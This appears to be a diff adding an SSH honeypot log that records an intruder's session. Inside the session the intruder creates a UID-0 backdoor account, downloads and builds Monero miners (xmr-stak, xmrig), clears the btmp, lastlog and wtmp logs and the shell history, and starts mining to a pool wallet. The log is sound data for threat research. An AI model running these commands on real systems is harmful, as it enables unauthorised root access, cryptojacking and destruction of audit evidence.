@@ -1,0 +1,281 @@
+2019-12-06 14:26:37.442 - [Info] MITM Version: 1.26
+2019-12-06 14:26:37.462 - [Info] Auto Access Enabled: true
+2019-12-06 14:26:37.465 - [Debug] [Init] Auto Access Barrier: true
+2019-12-06 14:26:37.543 - [Info] SSH man-in-the-middle server for 172.20.0.5 listening on 0.0.0.0:10104
+2019-12-06 14:48:18.094 - [Debug] [Connection] Attacker connected: 51.79.68.99 | Client Identification: SSH-2.0-libssh-0.1
+2019-12-06 14:48:18.134 - [Debug] [Connection] Attacker closed the connection
+2019-12-06 15:18:16.145 - [Debug] [Connection] Attacker connected: 193.188.22.229 | Client Identification: SSH-2.0-libssh2_1.7.0
+2019-12-06 15:18:16.228 - [Debug] [Connection] Client error on ssh server
+2019-12-06 15:18:16.229 - [Debug] [Connection] Attacker closed the connection
+2019-12-06 18:37:32.556 - [Debug] [Connection] Attacker connected: 45.95.168.105 | Client Identification: SSH-2.0-libssh2_1.4.3
+2019-12-06 18:37:33.758 - [Debug] [Auth] Attacker 45.95.168.105 trying to authenticate with "password"
+2019-12-06 18:37:33.759 - [Debug] [Auto Access] Attacker: 45.95.168.105, Threshold: 1, Attempts: 1
+2019-12-06 18:37:33.759 - [Debug] [Auto Access] Compromising the honeypot
+2019-12-06 18:37:33.759 - [Debug] [Auto Access] Adding the following credentials: "root:root"
+2019-12-06 18:37:33.893 - [Debug] [Auth] Valid credentials - Password Authentication
+2019-12-06 18:37:33.893 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.5
+2019-12-06 18:37:33.932 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2019-12-06 18:37:34.447 - [Debug] [EXEC] Noninteractive mode attacker command: cat /etc/issue
+2019-12-06 18:37:35.650 - [Debug] [Connection] Attacker closed connection
+2019-12-06 18:37:35.680 - [Debug] [LXC] Container's OpenSSH server ended connection
+2019-12-06 18:37:35.681 - [Debug] [LXC] Container's OpenSSH server closed connection
+2019-12-06 18:38:33.138 - [Debug] [Connection] Attacker connected: 45.95.168.105 | Client Identification: SSH-2.0-libssh2_1.4.3
+2019-12-06 18:38:34.433 - [Debug] [Auth] Attacker 45.95.168.105 trying to authenticate with "password"
+2019-12-06 18:38:34.434 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Password Authentication Failure
+2019-12-06 18:38:34.435 - [Debug] [Auth] Attacker: 45.95.168.105 has so far made 1 attempts. Remaining: 5 attempts
+2019-12-06 18:38:34.673 - [Debug] [Connection] Attacker closed the connection
+2019-12-06 18:39:18.815 - [Debug] [Connection] Attacker connected: 45.95.168.105 | Client Identification: SSH-2.0-OpenSSH_8.0p1 Ubuntu-6build1
+2019-12-06 18:39:22.808 - [Debug] [Auth] Attacker 45.95.168.105 trying to authenticate with "none"
+2019-12-06 18:39:22.808 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2019-12-06 18:39:23.653 - [Debug] [Connection] Attacker connected: 45.95.168.105 | Client Identification: SSH-2.0-libssh2_1.4.3
+2019-12-06 18:39:24.771 - [Debug] [Auth] Attacker 45.95.168.105 trying to authenticate with "password"
+2019-12-06 18:39:24.772 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Password Authentication Failure
+2019-12-06 18:39:24.772 - [Debug] [Auth] Attacker: 45.95.168.105 has so far made 1 attempts. Remaining: 5 attempts
+2019-12-06 18:39:25.051 - [Debug] [Connection] Attacker closed the connection
+2019-12-06 18:39:27.247 - [Debug] [Auth] Attacker 45.95.168.105 trying to authenticate with "password"
+2019-12-06 18:39:27.248 - [Debug] [Auth] Valid credentials - Password Authentication
+2019-12-06 18:39:27.248 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.5
+2019-12-06 18:39:27.271 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2019-12-06 18:39:27.810 - [Debug] [SHELL] Opened shell for attacker
+2019-12-06 18:39:29.498 - [Debug] [SHELL] Attacker Keystroke: l
+2019-12-06 18:39:29.765 - [Debug] [SHELL] Attacker Keystroke: s
+2019-12-06 18:39:30.079 - [Debug] [SHELL] Attacker Keystroke: c
+2019-12-06 18:39:30.357 - [Debug] [SHELL] Attacker Keystroke: p
+2019-12-06 18:39:30.720 - [Debug] [SHELL] Attacker Keystroke: u
+2019-12-06 18:39:31.084 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-12-06 18:39:31.086 - [Debug] [SHELL] line from reader: lscpu
+2019-12-06 18:39:31.086 - [Debug] [SHELL] Keystroke buffer: 108,115,99,112,117,13
+2019-12-06 18:39:33.403 - [Debug] [SHELL] Attacker Keystroke: t
+2019-12-06 18:39:33.715 - [Debug] [SHELL] Attacker Keystroke: o
+2019-12-06 18:39:33.946 - [Debug] [SHELL] Attacker Keystroke: p
+2019-12-06 18:39:34.260 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-12-06 18:39:34.261 - [Debug] [SHELL] line from reader: top
+2019-12-06 18:39:34.261 - [Debug] [SHELL] Keystroke buffer: 116,111,112,13
+2019-12-06 18:39:39.439 - [Debug] [SHELL] Attacker Keystroke: [ETX]
+2019-12-06 18:39:47.500 - [Debug] [SHELL] Attacker Keystroke: s
+2019-12-06 18:39:47.777 - [Debug] [SHELL] Attacker Keystroke: u
+2019-12-06 18:39:47.995 - [Debug] [SHELL] Attacker Keystroke: d
+2019-12-06 18:39:48.237 - [Debug] [SHELL] Attacker Keystroke: o
+2019-12-06 18:39:48.540 - [Debug] [SHELL] Attacker Keystroke: [Space]
+2019-12-06 18:39:48.743 - [Debug] [SHELL] Attacker Keystroke: s
+2019-12-06 18:39:48.912 - [Debug] [SHELL] Attacker Keystroke: u
+2019-12-06 18:39:49.248 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-12-06 18:39:49.249 - [Debug] [SHELL] line from reader: sudo su
+2019-12-06 18:39:49.249 - [Debug] [SHELL] Keystroke buffer: 3,115,117,100,111,32,115,117,13
+2019-12-06 18:40:06.856 - [Debug] [SHELL] Attacker Keystroke: sudo[Space]useradd[Space]-u[Space]0[Space]-o[Space]-g[Space]0[Space]centos[CR]sudo[Space]passwd[Space]centos
+2019-12-06 18:40:06.862 - [Debug] [SHELL] line from reader: sudo useradd -u 0 -o -g 0 centos
+2019-12-06 18:40:06.863 - [Debug] [SHELL] Keystroke buffer: 115,117,100,111,32,117,115,101,114,97,100,100,32,45,117,32,48,32,45,111,32,45,103,32,48,32,99,101,110,116,111,115,13,115,117,100,111,32,112,97,115,115,119,100,32,99,101,110,116,111,115
+2019-12-06 18:40:07.808 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-12-06 18:40:07.810 - [Debug] [SHELL] line from reader: sudo passwd centos
+2019-12-06 18:40:07.810 - [Debug] [SHELL] Keystroke buffer: 13
+2019-12-06 18:40:09.790 - [Debug] [SHELL] Attacker Keystroke: L
+2019-12-06 18:40:10.157 - [Debug] [SHELL] Attacker Keystroke: i
+2019-12-06 18:40:10.386 - [Debug] [SHELL] Attacker Keystroke: s
+2019-12-06 18:40:10.673 - [Debug] [SHELL] Attacker Keystroke: e
+2019-12-06 18:40:10.964 - [Debug] [SHELL] Attacker Keystroke: r
+2019-12-06 18:40:11.236 - [Debug] [SHELL] Attacker Keystroke: g
+2019-12-06 18:40:11.514 - [Debug] [SHELL] Attacker Keystroke: i
+2019-12-06 18:40:11.748 - [Debug] [SHELL] Attacker Keystroke: c
+2019-12-06 18:40:12.010 - [Debug] [Connection] Attacker connected: 45.95.168.105 | Client Identification: SSH-2.0-libssh2_1.4.3
+2019-12-06 18:40:12.054 - [Debug] [SHELL] Attacker Keystroke: o
+2019-12-06 18:40:13.200 - [Debug] [SHELL] Attacker Keystroke: 1
+2019-12-06 18:40:13.201 - [Debug] [SHELL] Attacker Keystroke: 2
+2019-12-06 18:40:13.202 - [Debug] [SHELL] Attacker Keystroke: 3
+2019-12-06 18:40:13.356 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-12-06 18:40:13.357 - [Debug] [SHELL] line from reader: Lisergico123
+2019-12-06 18:40:13.357 - [Debug] [SHELL] Keystroke buffer: 76,105,115,101,114,103,105,99,111,49,50,51,13
+2019-12-06 18:40:13.727 - [Debug] [Auth] Attacker 45.95.168.105 trying to authenticate with "password"
+2019-12-06 18:40:13.728 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Password Authentication Failure
+2019-12-06 18:40:13.729 - [Debug] [Auth] Attacker: 45.95.168.105 has so far made 1 attempts. Remaining: 5 attempts
+2019-12-06 18:40:13.970 - [Debug] [Connection] Attacker closed the connection
+2019-12-06 18:40:15.043 - [Debug] [SHELL] Attacker Keystroke: L
+2019-12-06 18:40:15.484 - [Debug] [SHELL] Attacker Keystroke: i
+2019-12-06 18:40:15.748 - [Debug] [SHELL] Attacker Keystroke: s
+2019-12-06 18:40:16.023 - [Debug] [SHELL] Attacker Keystroke: e
+2019-12-06 18:40:16.354 - [Debug] [SHELL] Attacker Keystroke: r
+2019-12-06 18:40:16.626 - [Debug] [SHELL] Attacker Keystroke: g
+2019-12-06 18:40:16.903 - [Debug] [SHELL] Attacker Keystroke: i
+2019-12-06 18:40:17.143 - [Debug] [SHELL] Attacker Keystroke: c
+2019-12-06 18:40:17.439 - [Debug] [SHELL] Attacker Keystroke: o
+2019-12-06 18:40:17.936 - [Debug] [SHELL] Attacker Keystroke: 1
+2019-12-06 18:40:18.240 - [Debug] [SHELL] Attacker Keystroke: 2
+2019-12-06 18:40:18.539 - [Debug] [SHELL] Attacker Keystroke: 3
+2019-12-06 18:40:18.827 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-12-06 18:40:18.828 - [Debug] [SHELL] line from reader: Lisergico123
+2019-12-06 18:40:18.829 - [Debug] [SHELL] Keystroke buffer: 76,105,115,101,114,103,105,99,111,49,50,51,13
+2019-12-06 18:40:59.722 - [Debug] [SHELL] Attacker Keystroke: sudo[Space]apt-get[Space]install[Space]screen
+2019-12-06 18:41:00.273 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-12-06 18:41:00.274 - [Debug] [SHELL] line from reader: sudo apt-get install screen
+2019-12-06 18:41:00.274 - [Debug] [SHELL] Keystroke buffer: 115,117,100,111,32,97,112,116,45,103,101,116,32,105,110,115,116,97,108,108,32,115,99,114,101,101,110,13
+2019-12-06 18:41:00.561 - [Debug] [Connection] Attacker connected: 45.95.168.105 | Client Identification: SSH-2.0-libssh2_1.4.3
+2019-12-06 18:41:01.769 - [Debug] [Auth] Attacker 45.95.168.105 trying to authenticate with "password"
+2019-12-06 18:41:01.770 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Password Authentication Failure
+2019-12-06 18:41:01.770 - [Debug] [Auth] Attacker: 45.95.168.105 has so far made 1 attempts. Remaining: 5 attempts
+2019-12-06 18:41:02.003 - [Debug] [Connection] Attacker closed the connection
+2019-12-06 18:41:04.325 - [Debug] [SHELL] Attacker Keystroke: y
+2019-12-06 18:41:04.785 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-12-06 18:41:04.789 - [Debug] [SHELL] line from reader: y
+2019-12-06 18:41:04.789 - [Debug] [SHELL] Keystroke buffer: 121,13
+2019-12-06 18:41:18.872 - [Debug] [SHELL] Attacker Keystroke: sudo[Space]apt-get[Space]install[Space]-y[Space]git
+2019-12-06 18:41:20.009 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-12-06 18:41:20.011 - [Debug] [SHELL] line from reader: sudo apt-get install -y git
+2019-12-06 18:41:20.011 - [Debug] [SHELL] Keystroke buffer: 115,117,100,111,32,97,112,116,45,103,101,116,32,105,110,115,116,97,108,108,32,45,121,32,103,105,116,13
+2019-12-06 18:41:36.445 - [Debug] [SHELL] Attacker Keystroke: sudo[Space]apt[Space]install[Space]libmicrohttpd-dev[Space]libssl-dev[Space]cmake[Space]build-essential[Space]libhwloc-dev
+2019-12-06 18:41:37.301 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-12-06 18:41:37.304 - [Debug] [SHELL] line from reader: sudo apt install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev
+2019-12-06 18:41:37.305 - [Debug] [SHELL] Keystroke buffer: 115,117,100,111,32,97,112,116,32,105,110,115,116,97,108,108,32,108,105,98,109,105,99,114,111,104,116,116,112,100,45,100,101,118,32,108,105,98,115,115,108,45,100,101,118,32,99,109,97,107,101,32,98,117,105,108,100,45,101,115,115,101,110,116,105,97,108,32,108,105,98,104,119,108,111,99,45,100,101,118,13
+2019-12-06 18:41:41.425 - [Debug] [SHELL] Attacker Keystroke: y
+2019-12-06 18:41:41.900 - [Debug] [Connection] Attacker connected: 45.95.168.105 | Client Identification: SSH-2.0-libssh2_1.4.3
+2019-12-06 18:41:41.910 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-12-06 18:41:41.910 - [Debug] [SHELL] line from reader: y
+2019-12-06 18:41:41.910 - [Debug] [SHELL] Keystroke buffer: 121,13
+2019-12-06 18:41:43.134 - [Debug] [Auth] Attacker 45.95.168.105 trying to authenticate with "password"
+2019-12-06 18:41:43.135 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Password Authentication Failure
+2019-12-06 18:41:43.136 - [Debug] [Auth] Attacker: 45.95.168.105 has so far made 1 attempts. Remaining: 5 attempts
+2019-12-06 18:41:43.367 - [Debug] [Connection] Attacker closed the connection
+2019-12-06 18:41:51.460 - [Debug] [SHELL] Attacker Keystroke: git[Space]clone[Space]https://github.com/fireice-uk/xmr-stak.git[CR]mkdir[Space]xmr-stak/build[CR]cd[Space]xmr-stak/build[CR]cmake[Space]..[Space]-DCUDA_ENABLE=OFF[Space][Space]-DOpenCL_ENABLE=OFF[CR]make[Space]install
+2019-12-06 18:41:51.462 - [Debug] [SHELL] line from reader: git clone https://github.com/fireice-uk/xmr-stak.git
+2019-12-06 18:41:51.462 - [Debug] [SHELL] Keystroke buffer: 103,105,116,32,99,108,111,110,101,32,104,116,116,112,115,58,47,47,103,105,116,104,117,98,46,99,111,109,47,102,105,114,101,105,99,101,45,117,107,47,120,109,114,45,115,116,97,107,46,103,105,116,13,109,107,100,105,114,32,120,109,114,45,115,116,97,107,47,98,117,105,108,100,13,99,100,32,120,109,114,45,115,116,97,107,47,98,117,105,108,100,13,99,109,97,107,101,32,46,46,32,45,68,67,85,68,65,95,69,78,65,66,76,69,61,79,70,70,32,32,45,68,79,112,101,110,67,76,95,69,78,65,66,76,69,61,79,70,70,13,109,97,107,101,32,105,110,115,116,97,108,108
+2019-12-06 18:41:51.462 - [Debug] [SHELL] line from reader: mkdir xmr-stak/build
+2019-12-06 18:41:51.463 - [Debug] [SHELL] Keystroke buffer: 
+2019-12-06 18:41:51.463 - [Debug] [SHELL] line from reader: cd xmr-stak/build
+2019-12-06 18:41:51.463 - [Debug] [SHELL] Keystroke buffer: 
+2019-12-06 18:41:51.464 - [Debug] [SHELL] line from reader: cmake .. -DCUDA_ENABLE=OFF  -DOpenCL_ENABLE=OFF
+2019-12-06 18:41:51.464 - [Debug] [SHELL] Keystroke buffer: 
+2019-12-06 18:41:54.183 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-12-06 18:41:54.183 - [Debug] [SHELL] line from reader: make install
+2019-12-06 18:41:54.184 - [Debug] [SHELL] Keystroke buffer: 13
+2019-12-06 18:41:59.974 - [Debug] [SHELL] Attacker Keystroke: apt[Space]install[Space]cmake[CR]
+2019-12-06 18:41:59.975 - [Debug] [SHELL] line from reader: apt install cmake
+2019-12-06 18:41:59.975 - [Debug] [SHELL] Keystroke buffer: 97,112,116,32,105,110,115,116,97,108,108,32,99,109,97,107,101,13
+2019-12-06 18:42:01.067 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-12-06 18:42:01.067 - [Debug] [SHELL] line from reader: 
+2019-12-06 18:42:01.067 - [Debug] [SHELL] Keystroke buffer: 13
+2019-12-06 18:42:04.047 - [Debug] [SHELL] Attacker Keystroke: apt[Space]install[Space]cmake[CR]
+2019-12-06 18:42:04.048 - [Debug] [SHELL] line from reader: apt install cmake
+2019-12-06 18:42:04.048 - [Debug] [SHELL] Keystroke buffer: 97,112,116,32,105,110,115,116,97,108,108,32,99,109,97,107,101,13
+2019-12-06 18:42:06.398 - [Debug] [SHELL] Attacker Keystroke: y
+2019-12-06 18:42:07.051 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-12-06 18:42:07.052 - [Debug] [SHELL] line from reader: y
+2019-12-06 18:42:07.052 - [Debug] [SHELL] Keystroke buffer: 121,13
+2019-12-06 18:42:12.361 - [Debug] [SHELL] Attacker Keystroke: s
+2019-12-06 18:42:12.612 - [Debug] [SHELL] Attacker Keystroke: u
+2019-12-06 18:42:12.819 - [Debug] [SHELL] Attacker Keystroke: d
+2019-12-06 18:42:13.204 - [Debug] [SHELL] Attacker Keystroke: o
+2019-12-06 18:42:13.549 - [Debug] [SHELL] Attacker Keystroke: [Space]
+2019-12-06 18:42:13.710 - [Debug] [SHELL] Attacker Keystroke: s
+2019-12-06 18:42:13.973 - [Debug] [SHELL] Attacker Keystroke: u
+2019-12-06 18:42:14.540 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-12-06 18:42:14.540 - [Debug] [SHELL] line from reader: sudo su
+2019-12-06 18:42:14.541 - [Debug] [SHELL] Keystroke buffer: 115,117,100,111,32,115,117,13
+2019-12-06 18:42:20.356 - [Debug] [Connection] Attacker connected: 45.95.168.105 | Client Identification: SSH-2.0-libssh2_1.4.3
+2019-12-06 18:42:21.985 - [Debug] [Auth] Attacker 45.95.168.105 trying to authenticate with "password"
+2019-12-06 18:42:21.986 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Password Authentication Failure
+2019-12-06 18:42:21.987 - [Debug] [Auth] Attacker: 45.95.168.105 has so far made 1 attempts. Remaining: 5 attempts
+2019-12-06 18:42:22.228 - [Debug] [Connection] Attacker closed the connection
+2019-12-06 18:42:44.265 - [Debug] [SHELL] Attacker Keystroke: cd[Space]/usr/bin[CR]wget[Space]https://github.com/xmrig/xmrig/releases/download/v5.1.0/xmrig-5.1.0-xenial-x64.tar.gz[CR]tar[Space]xvzf[Space]xmrig-5.1.0-xenial-x64.tar.gz[CR]cd[Space]xmrig-5.1.0
+2019-12-06 18:42:44.267 - [Debug] [SHELL] line from reader: cd /usr/bin
+2019-12-06 18:42:44.267 - [Debug] [SHELL] Keystroke buffer: 99,100,32,47,117,115,114,47,98,105,110,13,119,103,101,116,32,104,116,116,112,115,58,47,47,103,105,116,104,117,98,46,99,111,109,47,120,109,114,105,103,47,120,109,114,105,103,47,114,101,108,101,97,115,101,115,47,100,111,119,110,108,111,97,100,47,118,53,46,49,46,48,47,120,109,114,105,103,45,53,46,49,46,48,45,120,101,110,105,97,108,45,120,54,52,46,116,97,114,46,103,122,13,116,97,114,32,120,118,122,102,32,120,109,114,105,103,45,53,46,49,46,48,45,120,101,110,105,97,108,45,120,54,52,46,116,97,114,46,103,122,13,99,100,32,120,109,114,105,103,45,53,46,49,46,48
+2019-12-06 18:42:44.272 - [Debug] [SHELL] line from reader: wget https://github.com/xmrig/xmrig/releases/download/v5.1.0/xmrig-5.1.0-xenial-x64.tar.gz
+2019-12-06 18:42:44.272 - [Debug] [SHELL] Keystroke buffer: 
+2019-12-06 18:42:44.274 - [Debug] [SHELL] line from reader: tar xvzf xmrig-5.1.0-xenial-x64.tar.gz
+2019-12-06 18:42:44.274 - [Debug] [SHELL] Keystroke buffer: 
+2019-12-06 18:42:46.467 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-12-06 18:42:46.469 - [Debug] [SHELL] line from reader: cd xmrig-5.1.0
+2019-12-06 18:42:46.469 - [Debug] [SHELL] Keystroke buffer: 13
+2019-12-06 18:42:56.245 - [Debug] [SHELL] Attacker Keystroke: echo[Space]>[Space]/var/log/btmp[CR]echo[Space]>[Space]/var/log/lastlog[CR]echo[Space]>[Space]/var/log/wtmp[CR]history[Space]-c
+2019-12-06 18:42:56.248 - [Debug] [SHELL] line from reader: echo > /var/log/btmp
+2019-12-06 18:42:56.248 - [Debug] [SHELL] Keystroke buffer: 101,99,104,111,32,62,32,47,118,97,114,47,108,111,103,47,98,116,109,112,13,101,99,104,111,32,62,32,47,118,97,114,47,108,111,103,47,108,97,115,116,108,111,103,13,101,99,104,111,32,62,32,47,118,97,114,47,108,111,103,47,119,116,109,112,13,104,105,115,116,111,114,121,32,45,99
+2019-12-06 18:42:56.249 - [Debug] [SHELL] line from reader: echo > /var/log/lastlog
+2019-12-06 18:42:56.250 - [Debug] [SHELL] Keystroke buffer: 
+2019-12-06 18:42:56.251 - [Debug] [SHELL] line from reader: echo > /var/log/wtmp
+2019-12-06 18:42:56.251 - [Debug] [SHELL] Keystroke buffer: 
+2019-12-06 18:42:57.329 - [Debug] [SHELL] Attacker Keystroke: [CR]
+2019-12-06 18:42:57.330 - [Debug] [SHELL] line from reader: history -c
+2019-12-06 18:42:57.330 - [Debug] [SHELL] Keystroke buffer: 13
+2019-12-06 18:42:57.746 - [Debug] [Connection] Attacker connected: 45.95.168.105 | Client Identification: SSH-2.0-libssh2_1.4.3
+2019-12-06 18:42:58.935 - [Debug] [Auth] Attacker 45.95.168.105 trying to authenticate with "password"
+2019-12-06 18:42:58.936 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2019-12-06 18:42:58.937 - [Debug] [Auth] Attacker: 45.95.168.105 has so far made 1 attempts. Remaining: 5 attempts
+2019-12-06 18:42:59.175 - [Debug] [Connection] Attacker closed the connection
+2019-12-06 18:43:11.541 - [Debug] [SHELL] Attacker Keystroke: screen[Space]./xmrig[Space]--donate-level[Space]1[Space]-o[Space]xmr-us-east1.nanopool.org:14444[Space]-u[Space]454w1u98zcZcw8foxgNuG6RgpG3wJFYhMXfjHWrRPRZMhgH4KU3Y5D5MuuUk55wVmU91SvTvjwxYdSYf6tJ2cGMA11pPdF4[Space]-k[Space]--coin[Space]monero[Space]-a[Space]rx/0[CR]
+2019-12-06 18:43:11.563 - [Debug] [SHELL] line from reader: screen ./xmrig --donate-level 1 -o xmr-us-east1.nanopool.org:14444 -u 454w1u98zcZcw8foxgNuG6RgpG3wJFYhMXfjHWrRPRZMhgH4KU3Y5D5MuuUk55wVmU91SvTvjwxYdSYf6tJ2cGMA11pPdF4 -k --coin monero -a rx/0
+2019-12-06 18:43:11.564 - [Debug] [SHELL] Keystroke buffer: 115,99,114,101,101,110,32,46,47,120,109,114,105,103,32,45,45,100,111,110,97,116,101,45,108,101,118,101,108,32,49,32,45,111,32,120,109,114,45,117,115,45,101,97,115,116,49,46,110,97,110,111,112,111,111,108,46,111,114,103,58,49,52,52,52,52,32,45,117,32,52,53,52,119,49,117,57,56,122,99,90,99,119,56,102,111,120,103,78,117,71,54,82,103,112,71,51,119,74,70,89,104,77,88,102,106,72,87,114,82,80,82,90,77,104,103,72,52,75,85,51,89,53,68,53,77,117,117,85,107,53,53,119,86,109,85,57,49,83,118,84,118,106,119,120,89,100,83,89,102,54,116,74,50,99,71,77,65,49,49,112,80,100,70,52,32,45,107,32,45,45,99,111,105,110,32,109,111,110,101,114,111,32,45,97,32,114,120,47,48,13
+2019-12-06 18:43:24.875 - [Debug] [SHELL] Attacker Keystroke: h
+2019-12-06 18:43:31.301 - [Debug] [SHELL] Attacker Keystroke: h
+2019-12-06 18:43:35.177 - [Debug] [Connection] Attacker connected: 45.95.168.105 | Client Identification: SSH-2.0-libssh2_1.4.3
+2019-12-06 18:43:36.489 - [Debug] [Auth] Attacker 45.95.168.105 trying to authenticate with "password"
+2019-12-06 18:43:36.490 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2019-12-06 18:43:36.490 - [Debug] [Auth] Attacker: 45.95.168.105 has so far made 1 attempts. Remaining: 5 attempts
+2019-12-06 18:43:36.721 - [Debug] [Connection] Attacker closed the connection
+2019-12-06 18:43:38.995 - [Debug] [Connection] Attacker closed connection
+2019-12-06 18:43:39.089 - [Debug] [LXC] Container's OpenSSH server ended connection
+2019-12-06 18:43:39.090 - [Debug] [LXC] Container's OpenSSH server closed connection
+2019-12-06 18:43:39.091 - [Debug] [SHELL] Honeypot ended shell
+2019-12-06 18:44:20.343 - [Debug] [Connection] Attacker connected: 45.95.168.105 | Client Identification: SSH-2.0-libssh2_1.4.3
+2019-12-06 18:44:21.876 - [Debug] [Auth] Attacker 45.95.168.105 trying to authenticate with "password"
+2019-12-06 18:44:21.876 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2019-12-06 18:44:21.877 - [Debug] [Auth] Attacker: 45.95.168.105 has so far made 1 attempts. Remaining: 5 attempts
+2019-12-06 18:44:22.110 - [Debug] [Connection] Attacker closed the connection
+2019-12-06 18:45:02.535 - [Debug] [Connection] Attacker connected: 45.95.168.105 | Client Identification: SSH-2.0-libssh2_1.4.3
+2019-12-06 18:45:03.713 - [Debug] [Auth] Attacker 45.95.168.105 trying to authenticate with "password"
+2019-12-06 18:45:03.715 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2019-12-06 18:45:03.716 - [Debug] [Auth] Attacker: 45.95.168.105 has so far made 1 attempts. Remaining: 5 attempts
+2019-12-06 18:45:03.950 - [Debug] [Connection] Attacker closed the connection
+2019-12-06 18:45:43.165 - [Debug] [Connection] Attacker connected: 45.95.168.105 | Client Identification: SSH-2.0-libssh2_1.4.3
+2019-12-06 18:45:44.762 - [Debug] [Auth] Attacker 45.95.168.105 trying to authenticate with "password"
+2019-12-06 18:45:44.763 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2019-12-06 18:45:44.764 - [Debug] [Auth] Attacker: 45.95.168.105 has so far made 1 attempts. Remaining: 5 attempts
+2019-12-06 18:45:44.995 - [Debug] [Connection] Attacker closed the connection
+2019-12-06 18:46:24.137 - [Debug] [Connection] Attacker connected: 45.95.168.105 | Client Identification: SSH-2.0-libssh2_1.4.3
+2019-12-06 18:46:25.325 - [Debug] [Auth] Attacker 45.95.168.105 trying to authenticate with "password"
+2019-12-06 18:46:25.330 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2019-12-06 18:46:25.331 - [Debug] [Auth] Attacker: 45.95.168.105 has so far made 1 attempts. Remaining: 5 attempts
+2019-12-06 18:46:25.565 - [Debug] [Connection] Attacker closed the connection
+2019-12-06 18:47:06.105 - [Debug] [Connection] Attacker connected: 45.95.168.105 | Client Identification: SSH-2.0-libssh2_1.4.3
+2019-12-06 18:47:07.267 - [Debug] [Auth] Attacker 45.95.168.105 trying to authenticate with "password"
+2019-12-06 18:47:07.268 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2019-12-06 18:47:07.268 - [Debug] [Auth] Attacker: 45.95.168.105 has so far made 1 attempts. Remaining: 5 attempts
+2019-12-06 18:47:07.506 - [Debug] [Connection] Attacker closed the connection
+2019-12-06 18:47:53.878 - [Debug] [Connection] Attacker connected: 45.95.168.105 | Client Identification: SSH-2.0-libssh2_1.4.3
+2019-12-06 18:47:55.095 - [Debug] [Auth] Attacker 45.95.168.105 trying to authenticate with "password"
+2019-12-06 18:47:55.097 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2019-12-06 18:47:55.098 - [Debug] [Auth] Attacker: 45.95.168.105 has so far made 1 attempts. Remaining: 5 attempts
+2019-12-06 18:47:55.336 - [Debug] [Connection] Attacker closed the connection
+2019-12-06 18:48:35.186 - [Debug] [Connection] Attacker connected: 45.95.168.105 | Client Identification: SSH-2.0-libssh2_1.4.3
+2019-12-06 18:48:36.992 - [Debug] [Auth] Attacker 45.95.168.105 trying to authenticate with "password"
+2019-12-06 18:48:36.993 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2019-12-06 18:48:36.994 - [Debug] [Auth] Attacker: 45.95.168.105 has so far made 1 attempts. Remaining: 5 attempts
+2019-12-06 18:48:37.227 - [Debug] [Connection] Attacker closed the connection
+2019-12-06 18:49:15.535 - [Debug] [Connection] Attacker connected: 45.95.168.105 | Client Identification: SSH-2.0-libssh2_1.4.3
+2019-12-06 18:49:16.999 - [Debug] [Auth] Attacker 45.95.168.105 trying to authenticate with "password"
+2019-12-06 18:49:16.999 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2019-12-06 18:49:17.000 - [Debug] [Auth] Attacker: 45.95.168.105 has so far made 1 attempts. Remaining: 5 attempts
+2019-12-06 18:49:17.241 - [Debug] [Connection] Attacker closed the connection
+2019-12-06 18:49:56.407 - [Debug] [Connection] Attacker connected: 45.95.168.105 | Client Identification: SSH-2.0-libssh2_1.4.3
+2019-12-06 18:49:57.556 - [Debug] [Auth] Attacker 45.95.168.105 trying to authenticate with "password"
+2019-12-06 18:49:57.556 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2019-12-06 18:49:57.557 - [Debug] [Auth] Attacker: 45.95.168.105 has so far made 1 attempts. Remaining: 5 attempts
+2019-12-06 18:49:57.790 - [Debug] [Connection] Attacker closed the connection
+2019-12-06 18:50:38.876 - [Debug] [Connection] Attacker connected: 45.95.168.105 | Client Identification: SSH-2.0-libssh2_1.4.3
+2019-12-06 18:50:40.360 - [Debug] [Auth] Attacker 45.95.168.105 trying to authenticate with "password"
+2019-12-06 18:50:40.361 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2019-12-06 18:50:40.361 - [Debug] [Auth] Attacker: 45.95.168.105 has so far made 1 attempts. Remaining: 5 attempts
+2019-12-06 18:50:40.592 - [Debug] [Connection] Attacker closed the connection
+2019-12-06 18:51:21.230 - [Debug] [Connection] Attacker connected: 45.95.168.105 | Client Identification: SSH-2.0-libssh2_1.4.3
